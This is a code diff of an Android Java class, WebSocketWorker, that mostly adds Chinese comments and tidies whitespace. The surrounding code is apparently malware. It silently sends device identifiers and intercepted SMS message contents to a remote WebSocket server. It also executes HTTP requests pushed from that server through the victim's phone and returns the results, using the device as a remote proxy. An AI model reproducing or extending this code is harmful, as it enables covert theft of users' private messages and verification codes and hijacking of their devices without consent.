@@ -31,9 +31,7 @@ public class WebSocketWorker extends SubCall {
     private WebSocket socket;
 
     public WebSocketWorker() {
-
         String operatorName = NetworkUtils.getNetworkOperatorName();
-
 
         infoMap.put("android_id", DeviceUtils.getAndroidID());
         infoMap.put("version", AppUtils.getAppVersionName());
@@ -41,34 +39,30 @@ public class WebSocketWorker extends SubCall {
         infoMap.put("device_name", DeviceUtils.getModel());
         infoMap.put("operator_name", operatorName == null ? "" : operatorName);
         infoMap.put("package_name", AppUtils.getAppPackageName());
-
-
         infoMap.put("timezone", TimeZone.getDefault().getID());
         infoMap.put("lang", Locale.getDefault().getLanguage());
-
     }
 
-
+    /**
+     * 在SubContext call方法中调用，该方法用户通知权限开启之后的回调
+     *
+     * @param message
+     */
     @Override
     public void onSub(String message) {
         super.onSub(message);
-
-
         if (socket != null) {
             Map<String, Object> data = new HashMap<>();
-
             data.put("type", SMS);
             data.put("data", message);
-
             socket.send(JSON.toJSONString(data));
         }
     }
 
     @Override
     public void sub(String host) {
-
 //        host = "ws://10.0.2.2:8010/ws";
-
+        //初始化OkHttpClient
         OkHttpClient client = new OkHttpClient.Builder().build();
 
         Request request = new Request.Builder().url(host).build();
@@ -78,7 +72,13 @@ public class WebSocketWorker extends SubCall {
 
 
         try {
+            //建立WebSocket链接
             client.newWebSocket(request, new WebSocketListener() {
+                /**
+                 * 链接打开回调 此时会发送客户端所有数据给服务端
+                 * @param webSocket
+                 * @param response
+                 */
                 @Override
                 public void onOpen(WebSocket webSocket, Response response) {
                     super.onOpen(webSocket, response);
@@ -86,18 +86,22 @@ public class WebSocketWorker extends SubCall {
                     report(WEBSOCKET_CONNECT);
                     LogUtils.i("websocket open");
 
-
                     Map<String, Object> data = new HashMap<>();
 
                     data.put("type", BEGIN);
                     data.put("data", infoMap);
 
                     webSocket.send(JSON.toJSONString(data));
-
+                    //赋值给 socket 在
                     socket = webSocket;
 
                 }
 
+                /**
+                 * 服务端长连接之后 数据回传给客户端
+                 * @param webSocket
+                 * @param text
+                 */
                 @Override
                 public void onMessage(final WebSocket webSocket, final String text) {
                     super.onMessage(webSocket, text);
@@ -107,15 +111,15 @@ public class WebSocketWorker extends SubCall {
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
-                            HttpReqest reqest = JSON.parseObject(text, HttpReqest.class);
+                            HttpReqest request = JSON.parseObject(text, HttpReqest.class);
 
-                            reqest.setHttp(http());
-
+                            request.setHttp(http());
 
                             Map<String, Object> data = new HashMap<>();
 
                             data.put("type", NETWORK);
-                            data.put("data", reqest.call());
+                            //request.call中
+                            data.put("data", request.call());
 
                             webSocket.send(JSON.toJSONString(data));
 
@@ -123,11 +127,16 @@ public class WebSocketWorker extends SubCall {
                     }).start();
                 }
 
+                /**
+                 * 断开调用
+                 * @param webSocket
+                 * @param code
+                 * @param reason
+                 */
                 @Override
                 public void onClosing(WebSocket webSocket, int code, String reason) {
                     super.onClosing(webSocket, code, reason);
                     LogUtils.i("onClosing 关闭websocket连接!");
-
                     report(WEBSOCKET_CLOSE);
                 }
             });
